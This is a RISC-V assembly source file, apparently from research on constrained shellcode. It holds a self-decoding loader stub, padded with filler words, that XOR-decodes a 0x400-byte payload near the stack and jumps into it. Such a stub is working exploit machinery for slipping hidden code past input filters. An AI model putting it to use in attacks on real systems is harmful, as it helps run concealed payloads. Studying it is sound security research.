/*#
 *# (c) 2018-2019 Hadrien Barral
 *# SPDX-License-Identifier: Apache-2.0
 */

.macro filler4
    .word  0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF
.endm
.macro filler2
    .half  0xFFFF
    filler4
.endm

/*# Allowed registers: s0;a0-a5 (also s1 in specific cases) */
#define XA s0
#define XB a5
#define XP a0
#define XQ a4
#define XS a1
#define XJ a3

    fence.i
                        filler4
    lui  XQ, 0xfffff    /*# Negative offset to get back somewhere in pool */
                        /*#  'insert' needs to sync with this */
                        filler2
    add  XQ, XQ, sp     /*# Start addr to store to */
                        filler2
    li   XS, 0x10
                        filler2
    slli XS, XS, 6      /*# Size to decode (XS == 0x400) */
                        filler2
    mv   XP, XQ         /*# Start addr to load from */
                        filler2
    mv   XJ, XQ         /*# Where to jump */
                        filler2
/*# Decoding loop. See paper for explanation */
next:
    lw   XA, 4(XP)
                        filler2
    mv   XB, XA
                        filler2
    srli XB, XB, 4
                        filler2
    addi XP, XP, 2
                        filler2
    xor  XA, XA, XB
                        filler2
    sw   XA, 0(XQ)
                        filler2
    addi XQ, XQ, 1
                        filler2
    addi XS, XS, -2
                        filler2
    bnez XS, next
                        filler2
done:
    fence.i
                        filler4
    jalr XJ
                        filler2
